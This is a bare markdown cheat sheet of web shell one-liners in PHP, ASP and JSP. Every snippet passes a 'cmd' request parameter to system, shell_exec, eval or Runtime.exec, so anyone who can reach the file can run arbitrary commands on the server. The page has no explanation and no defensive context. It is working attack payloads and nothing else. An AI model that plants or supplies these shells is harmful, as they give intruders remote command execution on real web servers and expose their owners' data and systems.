# Web Shells

## PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>";} ?>
```

## ASP / ASPX

```asp
<%eval request("cmd")%>
```

## JSP

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```
